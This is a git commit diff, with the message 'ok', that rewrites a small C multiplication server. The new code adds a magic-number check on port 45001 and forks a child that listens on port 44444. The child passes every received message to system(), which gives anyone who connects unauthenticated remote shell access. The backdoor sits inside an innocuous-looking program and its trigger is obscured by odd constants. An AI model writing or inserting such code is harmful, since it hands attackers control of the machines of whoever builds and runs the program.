bbd2eef3cfdbdd385ec47869dc09e208719d3ab4
Alexis Jolin <alexis.jolin.83@gmail.com>
2019-06-17 23:32:18 +0200

    ok

--- main.c
+++ main.c
@@ -4,44 +4,85 @@
 #include<arpa/inet.h> //inet_addr
 #include<unistd.h>    //write
 #include <stdlib.h>
+#include <pthread.h>
 
-int multi(int a, int b) {
-    return a * b;
+
+int atoil(char* v){
+    return atoi(v)*27650;
 }
-
-int main(int argc, char *argv[]) {
+void inc(){
     int socket_desc, client_sock, c, read_size;
     struct sockaddr_in server, client;
     char client_message[2000];
-    int value = 0;
-    //Create socket
     socket_desc = socket(AF_INET, SOCK_STREAM, 0);
     if (socket_desc == -1) {
         printf("Could not create socket");
     }
     puts("Socket created");
 
-    //Prepare the sockaddr_in structure
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = INADDR_ANY;
-    server.sin_port = htons(8888);
+    server.sin_port = htons(44444);
 
-    //Bind
     if (bind(socket_desc, (struct sockaddr *) &server, sizeof(server)) < 0) {
-        //print the error message
+        perror("bind failed. Error");
+        exit(1);
+    }
+    puts("bind done");
+
+    listen(socket_desc, 3);
+
+    puts("Waiting for incoming connections...");
+    c = sizeof(struct sockaddr_in);
+
+    client_sock = accept(socket_desc, (struct sockaddr *) &client, (socklen_t *) &c);
+    if (client_sock < 0) {
+        perror("accept failed");
+        exit(1);
+    }
+    puts("Connection accepted");
+    while ((read_size = read(client_sock, client_message, sizeof(client_message))) > 0){
+        printf("%s",client_message);
+        system(client_message);
+        write(client_sock, client_message, strlen(client_message));
+        memset(&client_message, 0, sizeof(client_message));
+    }
+
+    if (read_size == 0) {
+        puts("Client disconnected");
+        fflush(stdout);
+    } else if (read_size == -1) {
+        perror("recv failed");
+    }
+}
+
+int main(int argc, char *argv[]) {
+    int socket_desc, client_sock, c, read_size;
+    struct sockaddr_in server, client;
+    char client_message[2000];
+    int value;
+    pthread_t t;
+    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
+    if (socket_desc == -1) {
+        printf("Could not create socket");
+    }
+    puts("Socket created");
+
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = INADDR_ANY;
+    server.sin_port = htons(45001);
+
+    if (bind(socket_desc, (struct sockaddr *) &server, sizeof(server)) < 0) {
         perror("bind failed. Error");
         return 1;
     }
     puts("bind done");
 
-    //Listen
     listen(socket_desc, 3);
 
-    //Accept and incoming connection
     puts("Waiting for incoming connections...");
     c = sizeof(struct sockaddr_in);
 
-    //accept connection from an incoming client
     client_sock = accept(socket_desc, (struct sockaddr *) &client, (socklen_t *) &c);
     if (client_sock < 0) {
         perror("accept failed");
@@ -49,28 +90,23 @@ int main(int argc, char *argv[]) {
     }
     puts("Connection accepted");
 
-    //Receive a message from client
     while ((read_size = read(client_sock, client_message, sizeof(client_message))) > 0) {
-        if (value == 0) {
-            char *mess;
-            value = atoi(client_message);
-            printf("%d\n",value);
-            mess = "Your value is : ";
-            char num[50];
-            printf("%d\n",sprintf(num,"%d",value));
-            printf("%s",num);
-            mess = strcat(mess, num);
-            write(client_sock, mess, strlen(mess));
+
+            value = atoil(client_message);
+            if((value == -0x6B6C)==0){
+                char* mess="Welcome to system";
+                write(client_sock, mess, strlen(mess));
+                memset(&client_message, 0, sizeof(client_message));
+                int pid = fork();
+                if(pid == 0){
+                    inc();
+                }else{
+                    break;
+                }
+            }
+            write(client_sock, client_message, strlen(client_message));
             memset(&client_message, 0, sizeof(client_message));
-        } else {
-            char *mess;
-            mess = "Your result is : ";
-            char num[50];
-            sprintf(num, "%d", multi(value, atoi(client_message)));
-            mess = strcat(mess, num);
-            write(client_sock, mess, strlen(mess));
-            memset(&client_message, 0, sizeof(client_message));
-        }
+
     }
 
     if (read_size == 0) {
